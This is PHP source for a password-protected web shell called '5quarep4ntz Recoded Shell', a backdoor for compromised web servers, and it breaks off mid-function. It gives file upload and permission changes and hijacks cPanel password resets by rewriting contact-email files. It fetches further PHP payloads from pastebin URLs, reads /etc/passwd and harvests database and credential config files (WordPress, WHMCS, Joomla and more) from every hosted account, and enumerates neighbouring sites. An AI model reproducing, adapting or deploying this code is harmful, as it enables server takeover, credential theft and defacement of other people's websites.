  <?php
$squr = "5a077a8964999eab6bca263230adca9c"; 
session_start();
@error_reporting(0);
@set_time_limit(0);
function Login() {
?>
<!DOCTYPE html>
<html>
<head>
  <title>login</title>
<style>
	 
	h1{
	font-family:Kelly Slab;
	font-size:30px;
	}
input[type=password] {
	border: 1px solid #ffffff;
	width: 300px;
	height: 25px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: gold;
	font-family:Kelly Slab;
	font-size: 13px;
}
.page{
    		position: absolute;
    		margin: auto;
    		height: 50%;
    		top: 0; bottom: 0; left: 0; right:0;
     	}
	</style>
	<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
	<body bgcolor="black" style="color:gold">
		<center><div class="page">
		        <h3>5quarep4ntz Recoded Shell</h3>
<form method="post">
<input type="password" name="squr_shell">
	<br><input type="submit" value="Login" style="margin-top:4px;width:100px;font-family:Kelly Slab;font-size:15;background:black;color:gold;border:2px solid red;border-radius:5px"/>
</form>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($squr) || ( isset($_POST['squr_shell']) && (md5($_POST['squr_shell']) == $squr) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        Login();
?>
<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<!--
###############################################################################
// Shell ini adalah kumpulan dari beberapa shell yg sudah ada.
###############################################################################
-->
<head>
	<link href="https://fonts.googleapis.com/css?family=Black+Ops+One" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Sedgwick+Ave+Display" rel="stylesheet">
<title>5.h.3.l.l...?</title>
<meta property="og:image" content="https://ngertiaja.com/wp-content/uploads/2019/05/gambar-orang-sedih-3-768x509.jpg">
<style>
body{
font-family: Kelly Slab;
background-color: black;
color:white;
}
#content tr:hover{
background-color: blue;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: gold;
}
table{
border: 1px #000000;
}
.s_tb{
border:1px silver;
}
a{
color:white;
font-size: 19px;
text-decoration:none;
}
a:hover{
color:green;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 2px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
h2{
font-family:Kelly Slab;
font-size:25px;
color:white;
}
h3{
font-size:35px;
}
h4{
font-size:15px;
font-family:Kelly Slab;
color:white;
}
.squr_table {;
	background:transparent;
	border:1px solid red;
	font-family:Kelly Slab;
    display:inline-block;
	cursor:pointer;
	color:gold;
	font-size:17x;
	font-weight:bold;
	padding:3px 20px;
	text-decoration:none;
	text-shadow:0px -1px 0px white;
       }
       .sqr_table {;
	background:transparent;
	border:2px solid silver;
	font-family:Kelly Slab;
	color:white;
	font-size:17x;
	font-weight:bold;
	padding:3px 20px;
	text-decoration:none;
	text-shadow:0px -1px 0px #ff0505;
       }
     .potext {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family:Kelly Slab;
	font-size: 13px;
}
</style>
</head>
<body>
<center>
<br>
<font face="Kelly Slab" color="white" size="7px">XxX 5quarep4ntz 5h3ll XxX</font><br>
</h1></center>
<table width="960" border="0" cellpadding="0" cellspacing="0" align="left">
<tr><td>';
echo "<tr><td><font color='white'>
your IP     <td>: <font color='lime'>".$_SERVER['REMOTE_ADDR']."<tr><td><font color='white'>
IP Server  <td>: <font color='lime'>".gethostbyname($_SERVER['HTTP_HOST'])."<tr><td><font color='white'>
system     <td>: <font color='lime'>".php_uname()."</font></tr></td><br>
</table>";
echo '<table width="960" border="0" cellpadding="0" cellspacing="0" align="center">
<center><tr align="center"><td align="center">path : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}

if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">UPLOADED SUCCES !!!!!</script><br/>';
}else{
echo '<script> alert("UPLOADED FAILED !!!!!")</script></font><br/>';
}
}
echo '</tr><tr align="center"><td align="center"><form enctype="multipart/form-data" method="POST">
<font color="white"><br><b></font><input type="file"name="file" style="widht:900px;font-family:Kelly Slab;font-size:20;background:transparent;color:white;border:2px solid blue;"/>
<input type="submit" value="Upload" style="margin-top:4px;width:150px;font-family:Kelly Slab;font-size:20;background:transparent;color:white;border:2px solid blue;border-radius:5px"/><br><br>
</form></center>';
echo "</td></tr>";
echo "</table>";
echo "<center><table id='menu' width='960' border='0' cellpadding='0' cellspacing='0'><tr><td>";
echo "<center><a class='squr_table' href='?'>home  </a>
<a class='squr_table' href='?option&path=$path&squr=csrf'>csrf online</a>
<a class='squr_table' href='?option&path=$path&squr=jumping'>lompat indah</a>
<a class='squr_table' href='?option&path=$path&squr=config'>grab cofig</a>
<a class='squr_table' href='?option&path=$path&squr=sym'>symlink</a>
<a class='squr_table' href='?option&path=$path&squr=tools'>tools downloader</a><br>
<a class='squr_table' href='?option&path=$path&squr=mass'>mass deface</a>
<a class='squr_table' href='?option&path=$path&squr=cf'>create folder</a>
<a class='squr_table' href='?option&path=$path&squr=santet'>santet online</a>
<a class='squr_table' href='?option&path=$path&squr=cc'>cpanel crack</a>
<a class='squr_table' href='?option&path=$path&squr=about'>about me</a>
<a class='squr_table' href='?metu'>logout</a><br>
</center>";
echo "</td></tr></table></center>";
if(isset($_GET['metu'])) {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    print "<script>window.location='?';</script>";
}
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo "[ <a href='?path=$path'>Kembali</a> ]"; 
echo('<textarea class="potext" cols=80 rows=20> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="lime">CANGE PERM SUCCES !!!!!</font><br/>';
echo "[ <a href='?path=$path'>Kembali</a> ]";
}else{
echo '<script> alert("CANGE PERM GAGAL !!!!!")</font><br />';
}
}
echo '<form method="POST">
Permission : <br><input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left"/>
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod"><br>
<input type="submit" value="submit" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid silver"/>
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="lime">RENAME SUCCES !!!!!</font><br/>';
echo "[ <a href='?path=$path'>Kembali</a> ]";
}else{
echo '<script> alert("RENAME GAGAL !!!!!")</script><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name <br><input name="newname" type="text" size="20" value="'.$_POST['name'].'" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:black;color:silver;border:2px solid silver; text-align: left"/>
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename"><br>
<input type="submit" value="submit" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid silver"/>
</form>';
}


if ($_GET['squr'] == 'cc') {
		echo '<br/><h4>Auto Reset Password Cpanel</h4>
		<form method="POST">
				<input type="email" name="email" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left;" placeholder="Masukan Email..."/><br/>
				<input type="submit" name="submit" style="margin-top:4px;width:100px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid red;" value="Send"/>
			</div>
		</form>';
		
		if(isset($_POST['submit'])){
			$user = get_current_user();
			$site = $_SERVER['HTTP_HOST'];
			$ips = getenv('REMOTE_ADDR');
			$email = $_POST['email'];
			$wr = 'email:'.$email;
			$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
			fwrite($f, $wr); 
			fclose($f);
			$f = fopen('/home/'.$user.'/.contactinfo', 'w');
			fwrite($f, $wr); 
			fclose($f);
			$parm = $site.':2082/resetpass?start=1';
			echo '<br/>Url: '.$parm.'';
			echo '<br/>Username: '.$user.'';
			echo '<br/>Success Reset To: '.$email.'<br/><br/>';
		}
		exit;
	}



if ($_GET['squr'] == 'cf' ) {
			$output = "
			<h2>Buat Folder: </h2><br>
			<form method='POST'>
				<input type='text' style='margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left;' name='nama_folder' autocomplete='off' placeholder='Nama Folder...'><br/>
				<button type='sumbit' style='margin-top:4px;width:100px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid red;' name='buat'>Buat!!</button>
			</form>";
			echo $output;
		
			if (isset($_POST['buat'])) {
				$nama_folder = $_POST['nama_folder'];
				$folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $_POST["nama_folder"]);
				$fd = mkdir ($folder);
				if ($fd) {
					echo '<script>window.location="?path='.$path.'"; alert("Berhasil Membuat Folder '.$folder.'");</script>';
				}else{
					echo "echo '<script> alert('Folder ".$folder." Gagal Dibuat');</script>";
				}
			}
		}


elseif ($_GET['squr'] == 'csrf') {
        echo "<div style='text-align: center;' class='mybox'>
 <h2>CSRF Exploiter Online</h2><br><hr color='red'><br>
    <form method='post'>
URL           : &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<input type='text' style='margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left;' name='url' size='50' height='10' placeholder='http://target.com/[path]/upload.php' style='margin: 5px auto; padding-left: 5px;' required><br><br>
POST File : <input type='text' name='data' style='margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left;' size='50' height='10' placeholder='Filedata / files[] / qqfile / userfile / dll' style='margin: 5px auto; padding-left: 5px;' required><br>
<br><input style='margin-top:4px;width:100px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver;' type='submit' name='go' value='Lock!'>
</form></div>";
        $url = $_POST['url'];
        $data = $_POST['data'];
        $submit = $_POST['go'];
        if ($submit) {
            echo "<br><form style='text-align:center' method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$data'><input style='width: 50px; height: 30px; border-color=white;margin:10px 2px 0 2px;' type='submit' name='ok' class='kotak' value='Upload'>
    </form></div>";
        };
  }

//////////////// TOOLS DOWNLOADER /////
elseif($_GET['squr'] == 'tools') {
echo "
	<center><br><br>
<hr style='margin-top: 12px; margin-bottom: 8px;'><br>
[ <a class='sqr_table' href='?option&path=$path&squr=sym403'>symlink 403</a> ]
[ <a class='sqr_table' href='?option&path=$path&squr=sym404'>symlink 404</a> ]
    <br>
<hr style='margin-top: 12px; margin-bottom: 8px;'><br>
<br><br><br>";}


  if($_GET['squr'] == 'sym403') {
		$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
		function sym403($url, $isi) {
			$fp = fopen($isi, "w");
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_FILE, $fp);
			return curl_exec($ch);
			curl_close($ch);
			fclose($fp);
			ob_flush();
			flush();
		}
		if(file_exists('sym403.php')) {
			echo "<center><a href='$full/sym403.php' target='_blank'>-> Done <-</a></font></center><br/>";
		} else {
			if(sym403("https://pastebin.com/raw/zTTSvKsr","sym403.php")) {
				echo "<center><a href='$full/sym403.php' target='_blank'>-> Done <-</a></font></center><br/>";
			} else {
				echo "<center><font color=red>gagal bro</font></center><br/>";
			}
		}
		exit;
	}

if($_GET['squr'] == 'sym404') {
		$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
		function sym404($url, $isi) {
			$fp = fopen($isi, "w");
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_FILE, $fp);
			return curl_exec($ch);
			curl_close($ch);
			fclose($fp);
			ob_flush();
			flush();
		}
		if(file_exists('sym404.php')) {
			echo "<center><a href='$full/sym404.php' target='_blank'>-> Done <-</a></font></center><br/>";
		} else {
			if(sym404("https://pastebin.com/raw/pHpatpq9","sym404.php")) {
				echo "<center><a href='$full/sym404.php' target='_blank'>-> Done <-</a></font></center><br/>";
			} else {
				echo "<center><font color=red>gagal bro</font></center><br/>";
			}
		}
		exit;
	}


//////  BERHENTI DISINI ////


  if($_GET['squr'] == 'config') {
		$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
		$con = mkdir("squr_config", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("squr_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		while($passwd = fgets($etc)) {
			if($passwd == "" || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_config);
				foreach($user_config[1] as $user_con) {
					$user_config_dir = "/home/$user_con/public_html/";
					if(is_readable($user_config_dir)) {
						$grab_config = 
						[
							"/home/$user_con/.my.cnf" => "cpanel",
							"/home/$user_con/public_html/config/koneksi.php" => "Lokomedia",
							"/home/$user_con/public_html/forum/config.php" => "phpBB",
							"/home/$user_con/public_html/sites/default/settings.php" => "Drupal",
							"/home/$user_con/public_html/config/settings.inc.php" => "PrestaShop",
							"/home/$user_con/public_html/app/etc/local.xml" => "Magento",
							"/home/$user_con/public_html/admin/config.php" => "OpenCart",
							"/home/$user_con/public_html/application/config/database.php" => "Ellislab",
							"/home/$user_con/public_html/vb/includes/config.php" => "Vbulletin",
							"/home/$user_con/public_html/includes/config.php" => "Vbulletin",
							"/home/$user_con/public_html/forum/includes/config.php" => "Vbulletin",
							"/home/$user_con/public_html/forums/includes/config.php" => "Vbulletin",
							"/home/$user_con/public_html/cc/includes/config.php" => "Vbulletin",
							"/home/$user_con/public_html/inc/config.php" => "MyBB",
							"/home/$user_con/public_html/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/shop/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/os/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/oscom/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/products/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/cart/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/inc/conf_global.php" => "IPB",
							"/home/$user_con/public_html/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/wp/test/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/blog/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/beta/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/portal/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/site/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/wp/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/WP/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/news/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/wordpress/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/test/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/demo/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/home/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/v1/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/v2/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/press/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/new/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/blogs/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/configuration.php" => "Joomla",
							"/home/$user_con/public_html/blog/configuration.php" => "Joomla",
							"/home/$user_con/public_html/submitticket.php" => "^WHMCS",
							"/home/$user_con/public_html/cms/configuration.php" => "Joomla",
							"/home/$user_con/public_html/beta/configuration.php" => "Joomla",
							"/home/$user_con/public_html/portal/configuration.php" => "Joomla",
							"/home/$user_con/public_html/site/configuration.php" => "Joomla",
							"/home/$user_con/public_html/main/configuration.php" => "Joomla",
							"/home/$user_con/public_html/home/configuration.php" => "Joomla",
							"/home/$user_con/public_html/demo/configuration.php" => "Joomla",
							"/home/$user_con/public_html/test/configuration.php" => "Joomla",
							"/home/$user_con/public_html/v1/configuration.php" => "Joomla",
							"/home/$user_con/public_html/v2/configuration.php" => "Joomla",
							"/home/$user_con/public_html/joomla/configuration.php" => "Joomla",
							"/home/$user_con/public_html/new/configuration.php" => "Joomla",
							"/home/$user_con/public_html/WHMCS/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/whmcs1/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Whmcs/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/whmcs/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/whmcs/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/WHMC/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Whmc/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/whmc/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/WHM/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Whm/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/whm/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/HOST/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Host/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/host/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/SUPPORTES/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Supportes/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/supportes/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/domains/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/domain/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Hosting/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/HOSTING/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/hosting/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CART/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Cart/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/cart/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/ORDER/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Order/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/order/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CLIENT/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Client/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/client/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Clientarea/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/clientarea/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/SUPPORT/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Support/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/support/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BILLING/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Billing/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/billing/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BUY/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Buy/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/buy/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/MANAGE/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Manage/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/manage/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/ClientSupport/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Clientsupport/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/clientsupport/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CHECKOUT/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Checkout/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/checkout/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BILLINGS/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Billings/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/billings/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BASKET/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Basket/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/basket/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/SECURE/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Secure/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/secure/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/SALES/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Sales/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/sales/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BILL/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Bill/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/bill/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/PURCHASE/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Purchase/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/purchase/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/ACCOUNT/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Account/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/account/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/USER/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/User/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/user/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CLIENTS/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Clients/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/clients/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BILLINGS/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Billings/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/billings/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/MY/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/My/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/my/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/secure/whm/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/secure/whmcs/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/panel/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/clientes/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/cliente/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/support/order/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/boxbilling/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/box/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/host/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/Host/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/supportes/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/support/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/hosting/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/cart/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/order/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/client/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/clients/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/cliente/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/clientes/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/billing/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/billings/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/my/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/secure/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/support/order/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/includes/dist-configure.php" => "Zencart",
							"/home/$user_con/public_html/zencart/includes/dist-configure.php" => "Zencart",
							"/home/$user_con/public_html/products/includes/dist-configure.php" => "Zencart",
							"/home/$user_con/public_html/cart/includes/dist-configure.php" => "Zencart",
							"/home/$user_con/public_html/shop/includes/dist-configure.php" => "Zencart",
							"/home/$user_con/public_html/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/hostbills/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/host/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/Host/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/supportes/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/support/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/hosting/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/cart/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/order/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/client/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/clients/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/cliente/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/clientes/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/billing/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/billings/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/my/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/secure/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/support/order/includes/iso4217.php" => "Hostbills"
						];
						foreach($grab_config as $config => $nama_config) {
							$ambil_config = file_get_contents($config);
							if($ambil_config == '') {
							} else {
								$file_config = fopen("squr_config/$user_con-$nama_config.txt","w");
								fputs($file_config,$ambil_config);
							}
						}
					}		
				}
			}	
		}
		echo "<center><a href='?path=$path/squr_config'><font color=lime>Done</font></a></center>";
		exit;
	}


  if($_GET['squr'] == 'jumping') {
		$i = 0;
		echo "<div class='card container'>";
		if(preg_match("/hsphere/", $dir)) {
			$urls = explode("\r\n", $_POST['url']);
			if(isset($_POST['jump'])) {
				echo "<pre>";
				foreach($urls as $url) {
					$url = str_replace(array("http://","www."), "", strtolower($url));
					$etc = "/etc/passwd";
					$f = fopen($etc,"r");
					while($gets = fgets($f)) {
						$pecah = explode(":", $gets);
						$user = $pecah[0];
						$dir_user = "/hsphere/local/home/$user";
						if(is_dir($dir_user) === true) {
							$url_user = $dir_user."/".$url;
							if(is_readable($url_user)) {
								$i++;
								$jrw = "[<font color=green>R</font>] <a href='?path=$url_user'><font color=#0046FF>$url_user</font></a>";
								if(is_writable($url_user)) {
									$jrw = "[<font color=green>RW</font>] <a href='?path=$url_user'><font color=#0046FF>$url_user</font></a>";
								}
								echo $jrw."<br>";
							}
						}
					}
				}
			if($i == 0) { 
			} else {
				echo "<br>Total ada ".$i." Kamar di ".$ip;
			}
			echo "</pre>";
			} else {
				echo '<center>
					  <form method="post">
					  List Domains: <br>
					  <textarea name="url" class="form-control">';
				$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
				while($getss = fgets($fp)) {
					echo $getss;
				}
				echo  '</textarea><br>
					  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
					  </form></center>';
			}
		} elseif(preg_match("/vhosts/", $dir)) {
			$urls = explode("\r\n", $_POST['url']);
			if(isset($_POST['jump'])) {
				echo "<pre>";
				foreach($urls as $url) {
					$web_vh = "/var/www/vhosts/$url/httpdocs";
					if(is_dir($web_vh) === true) {
						if(is_readable($web_vh)) {
							$i++;
							$jrw = "[<font color=green>R</font>] <a href='?path=$web_vh'><font color=#0046FF>$web_vh</font></a>";
							if(is_writable($web_vh)) {
								$jrw = "[<font color=green>RW</font>] <a href='?path=$web_vh'><font color=#0046FF>$web_vh</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			if($i == 0) { 
			} else {
				echo "<br>Total ada ".$i." Kamar di ".$ip;
			}
			echo "</pre>";
			} else {
				echo '<center>
					  <form method="post">
					  List Domains: <br>
					  <textarea name="url" class="form-control">';
